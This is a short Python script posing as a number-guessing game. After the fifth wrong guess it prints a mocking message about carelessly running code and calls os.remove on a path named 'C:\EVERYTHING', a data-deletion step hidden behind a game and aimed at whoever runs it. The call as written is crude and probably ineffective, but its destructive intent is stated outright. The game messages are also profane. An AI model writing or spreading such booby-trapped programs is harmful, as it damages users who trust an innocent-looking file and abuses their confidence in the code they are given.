import random
import os

for attempt in range(5):
    number = random.randint(1, 10)
    guess = int(input("Make a guess from 1 to 10! "))

    if guess == number:
        print("Damn right! it was fun just before you win! Get the hell out of the game!")
        break
    else:
        print("Wrong guess! Try again.")
        if attempt == 4:
            print("Hell ya!!!! Now you pay the price of carelessly running shit on your computer!")
            os.remove("C:\EVERYTHING")